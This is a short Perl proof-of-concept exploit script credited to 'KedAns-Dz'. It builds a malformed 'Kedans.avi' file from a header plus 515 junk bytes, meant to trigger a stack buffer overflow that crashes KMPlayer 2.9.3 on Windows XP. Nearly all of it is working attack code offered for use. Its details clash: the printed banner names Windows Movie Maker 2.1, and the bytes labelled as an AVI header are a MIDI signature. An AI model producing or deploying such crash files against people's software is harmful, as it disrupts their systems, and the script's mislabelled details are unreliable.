#!/usr/bin/perl

###
# Title : KMPlayer 2.9.3 (.avi) Stack buffer Overflow
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com
# Home : HMD/AM (30008/04300) - Algeria -(00213555248701)
# Twitter page : twitter.com/kedans
# platform : Windows 
# Impact : Stack Overflow in 'KMPlayer.exe' Process , 
#      ++  and Blocked in KMP window form !!
# Tested on : Windows XP SP3 Fran.ais 
# Target : KMPlayer 2.9.3.1214
###
# Note : BAC 2011 Enchallah ( KedAns 'me' & BadR0 & Dr.Ride & Red1One & XoreR & Fox-Dz ... all )
# ------------
# Usage : 1 - Creat AVI file
#      =>    2 - Open AVI file With KMPlayer 2.9
#      =>    3 -  OverFlow !!!
# ------------
#START SYSTEM /root@MSdos/ :
system("title KedAns-Dz");
system("color 1e");
system("cls");
print "\n\n";                  
print "    |===========================================================|\n";
print "    |= [!] Name : Windows Movie Maker 2.1 (Import AVI video)   =|\n";
print "    |= [!] Exploit : Stack Buffer Overflow                     =|\n";
print "    |= [!] Author : KedAns-Dz                                  =|\n";
print "    |= [!] Mail: Ked-h(at)hotmail(dot)com                      =|\n";
print "    |===========================================================|\n";
sleep(2);
print "\n";
# Creating ...
my $PoC = "\x4D\x54\x68\x64\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00"; # AVI Header
my $Junk = "\x41" x 515 ; # Junk
open(file , ">", "Kedans.avi"); # Evil Video AVI (529 bytes) 4.0 KB
print file $PoC.$Junk;  
print "\n [+] File successfully created!\n" or die print "\n [-] OpsS! File is Not Created !! ";
close(file);  


